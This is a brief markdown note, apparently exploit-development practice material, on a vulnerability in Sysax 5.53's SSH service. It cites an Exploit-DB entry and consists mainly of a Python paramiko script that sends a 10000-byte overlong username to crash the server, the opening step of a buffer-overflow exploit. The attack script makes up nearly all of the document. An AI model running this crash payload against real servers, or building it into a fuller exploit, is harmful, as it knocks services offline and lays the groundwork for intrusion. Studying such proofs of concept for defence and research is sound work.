# Sysax 5.53

Downloaded from: https://www.exploit-db.com/exploits/18535
Vulnerable function: Settings -> Enable SSH port

## Initial Crash
```py
import paramiko,os,sys

TARGET_IP = "127.0.0.1"
TARGET_PORT = 22
target = (TARGET_IP, TARGET_PORT) 

CRASH_LEN = 10000  # change me

payload = b"A" * CRASH_LEN

transport = paramiko.Transport(target)	
transport.connect(username = payload, password = "test")	
transport.close()
```
